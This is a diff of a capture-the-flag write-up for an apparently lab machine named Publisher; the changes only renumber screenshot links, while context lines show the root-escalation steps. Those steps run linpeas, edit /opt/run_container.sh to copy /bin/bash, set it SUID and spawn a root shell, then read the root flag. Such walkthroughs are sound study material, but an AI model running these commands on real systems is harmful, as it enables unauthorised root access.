@@ -214,14 +214,14 @@ chmod 700 linpeas.sh
 ./linpeas.sh
 ```
 
-![publisher16](https://github.com/user-attachments/assets/634a5859-83c8-4d57-b2c5-fac8ac0ac7bc)
+![publisher17](https://github.com/user-attachments/assets/39606767-79f7-4811-86c6-6f10a002937d)
 
-![publisher17](https://github.com/user-attachments/assets/64813709-4963-4389-98b6-d3057eb13cda)
+![publisher18](https://github.com/user-attachments/assets/03ee5ad6-3177-469d-a2c8-7205ecb25d54)
 
 **Identifying Privilege Escalation Path:**  
 linpeas flagged an unusual file in `/opt`—`run_container.sh`. I examined it, and using the information from linpeas, I copied `/bin/bash` into the `/run/user/1000` directory, edited `run_container.sh` to spawn a privileged shell, and executed it:
 
-![publisher18](https://github.com/user-attachments/assets/9cf5d429-1492-4dca-becb-d239a7ca540d)
+![publisher19](https://github.com/user-attachments/assets/987d4d02-6bf0-4ece-9564-4148978c9be7)
 
 ```bash
 cp /bin/bash /run/user/1000
@@ -230,14 +230,14 @@ cd /opt
 nano run_container.sh
 ```
 
-![publisher19](https://github.com/user-attachments/assets/3434d28a-1141-4de9-a6b8-df02e8ced945)
+![publisher20](https://github.com/user-attachments/assets/b7c7f5a3-c1ac-487b-8072-4b710be44954)
 
-![publisher20](https://github.com/user-attachments/assets/8bcc77d8-b9f3-438c-a9a7-dad099f4e492)
+![publisher21](https://github.com/user-attachments/assets/10a1b473-5298-437d-b34a-339303783776)
 
 **Escalating to Root:**  
 Inside `run_container.sh`, I added a payload to create a root shell:
 
-![publisher21](https://github.com/user-attachments/assets/741ae5ef-44b2-4497-9d4e-e68282338d90)
+![publisher22](https://github.com/user-attachments/assets/942059be-2abf-4b6c-9ff3-cf7fbf51a57d)
 
 ```bash
 cp /bin/bash /tmp/bash
@@ -245,7 +245,7 @@ chmod +s /tmp/bash
 /tmp/bash -p
 ```
 
-![publisher22](https://github.com/user-attachments/assets/44eebca9-52da-40ca-919e-80bf1ab883be)
+![publisher23](https://github.com/user-attachments/assets/6418a39b-2b49-4721-8ad2-e816291e908a)
 
 This gave me a root shell, and I was able to read the root flag:
 
@@ -254,7 +254,7 @@ cd /root
 cat root.txt
 ```
 
-![publisher23](https://github.com/user-attachments/assets/5b79d411-ba8d-429f-ab62-dedddaae7588)
+![publisher24](https://github.com/user-attachments/assets/3bdb1074-16cd-4e94-8ef0-d055c9909923)
 
 ## 4. Takeaways 
 
